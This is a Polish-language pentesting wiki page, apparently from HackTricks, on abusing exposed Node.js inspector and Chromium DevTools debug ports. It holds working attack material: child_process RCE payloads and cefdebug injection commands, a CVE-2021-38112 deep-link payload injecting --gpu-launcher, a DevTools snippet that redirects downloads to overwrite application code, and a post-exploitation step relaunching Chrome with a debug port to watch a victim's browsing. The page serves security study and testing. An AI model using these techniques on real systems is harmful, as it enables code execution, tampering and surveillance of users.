# Node inspector/CEF debug abuse

Historyczne praktyczne przykłady obejmują walkthrough Multimaster oraz atak na debugger Visual Studio Code CVE-2019-1414; należy traktować je jako kontekst zależny od wersji, a nie zakładać, że każdy obecny target Electron lub Chromium udostępnia te same primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[Z dokumentacji](https://nodejs.org/learn/getting-started/debugging): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na połączenia od klienta debuggera. **Domyślnie** nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalny** **UUID**.<sup>[[4]](#references)</sup>

Klienci Inspectora muszą znać i określić adres hosta, port oraz UUID, aby się połączyć. Pełny URL będzie wyglądał mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonywania Node.js**, złośliwy aktor, który może połączyć się z tym portem, może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Istnieje kilka sposobów uruchomienia Inspectora:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Po uruchomieniu procesu poddanego inspekcji pojawi się coś takiego:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**) mogą udostępniać debugger za pomocą `--remote-debugging-port=9222`. Udostępnia to przeglądarkę przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a nie przez inspektora Node.js, dlatego payloady oparte na `process` z Node.js nie mają domyślnie bezpośredniego zastosowania.<sup>[[2]](#references)[[5]](#references)</sup>

Po uruchomieniu przeglądarki w trybie debugowania pojawi się coś takiego:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Przeglądarki, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Witryny otwarte w przeglądarce internetowej mogą wykonywać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne do **uzyskania unikalnego identyfikatora sesji debuggera**. **Same-origin policy** **uniemożliwia** witrynom nawiązanie **tego połączenia HTTP**. W celu dodatkowej ochrony przed [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js sprawdza, czy **nagłówki „Host”** połączenia określają **adres IP** lub dokładnie **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Te **środki bezpieczeństwa uniemożliwiają wykorzystanie inspectora** do uruchamiania kodu poprzez **samo wysłanie żądania HTTP** (co można by zrobić, wykorzystując SSRF vuln).<sup>[[4]](#references)</sup>

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby uruchomić w nim **inspector** na domyślnym porcie. Pamiętaj jednak, że musisz mieć wystarczające uprawnienia, więc może to zapewnić **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **wyłączenie procesu i uruchomienie nowego** z opcją `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zakończony** wraz z procesem.<sup>[[6]](#references)</sup>

### Połącz z inspector/debugger

Aby połączyć się z **przeglądarką opartą na Chromium**, można uzyskać dostęp do adresów `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że **docelowy host i port** są poprawnie wymienione. Obraz przedstawia przykład Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Po pojawieniu się adresu URL umożliwiającego dostęp do debuggera. np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connect to inspector/debugger: Aby połączyć się z przeglądarką opartą na Chromium,...](<../../images/image (674).png>)

Za pomocą **command line** można połączyć się z debuggerem/inspectorem za pomocą:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znajdowanie inspektorów** uruchomionych lokalnie oraz **wstrzykiwanie do nich kodu**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Pamiętaj, że exploity **RCE w NodeJS** nie zadziałają, jeśli połączysz się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć interesujące rzeczy, które można z nim zrobić).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Jeśli trafiłeś tutaj, szukając sposobu na uzyskanie [**RCE z XSS w Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Niektóre typowe sposoby uzyskania **RCE**, gdy możesz **połączyć się** z **inspectorem** Node, polegają na użyciu czegoś takiego (wygląda na to, że **nie zadziała to w połączeniu z Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads protokołu Chrome DevTools

API można sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
W tej sekcji wymienię tylko interesujące rzeczy, które zaobserwowałem u osób wykorzystujących ten protokół.

### Wstrzykiwanie parametrów za pośrednictwem Deep Links

W przypadku [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) firma Rhino Security odkryła, że aplikacja oparta na CEF **zarejestrowała niestandardowy UR**I w systemie (workspaces://index.html), który odbierał pełny URI, a następnie **uruchamiał aplikacj**ę opartą na CEF z konfiguracją częściowo konstruowaną na podstawie tego URI.<sup>[[8]](#references)</sup>

Odkryto, że parametry URI były dekodowane z formatu URL i używane do uruchomienia podstawowej aplikacji CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** do **wiersza poleceń** i wykonywać dowolne polecenia.<sup>[[8]](#references)</sup>

Zatem payload taki jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wykona calc.exe.<sup>[[8]](#references)</sup>

### Nadpisywanie plików

Zmień folder, w którym będą zapisywane **pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i exfiltration

STAR Labs pokazało, że ujawnione usługi WebDriver/CDP mogą umożliwiać odczyt dowolnych plików i RCE; DNS rebinding może w niektórych konfiguracjach dopełnić łańcuch exploita.<sup>[[9]](#references)</sup>

Dodatkowe historyczne przypadki dotyczące browser-automation i bezpieczeństwa Chromium znajdziesz w opracowaniu Counter WebDriver oraz w zgłoszeniach Project Zero 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

W rzeczywistym środowisku, **po przejęciu** komputera użytkownika korzystającego z browsera opartego na Chrome/Chromium, można uruchomić proces Chrome z **aktywowanym debuggingiem i przekierować port debugowania**, aby uzyskać do niego dostęp. W ten sposób można **monitorować wszystko, co ofiara robi w Chrome, i kraść poufne informacje**.<sup>[[7]](#references)</sup>

Stealth polega na **zakończeniu każdego procesu Chrome**, a następnie wywołaniu czegoś takiego:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Narzędzie do inspekcji i exploitation debuggera CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Zdalne wykonanie kodu w Visual Studio Code za pośrednictwem debuggera Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Przewodnik debugowania Node.js - Pierwsze kroki](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protokół Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abuse funkcji debugowania Chrome do zdalnego obserwowania i kontrolowania sesji przeglądania](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Zdalne wykonanie kodu w AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Rozmawiasz ze mną? - RCE WebDrivera za pośrednictwem DNS rebinding i CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - Od bota do RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (tracker błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (tracker błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (tracker błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
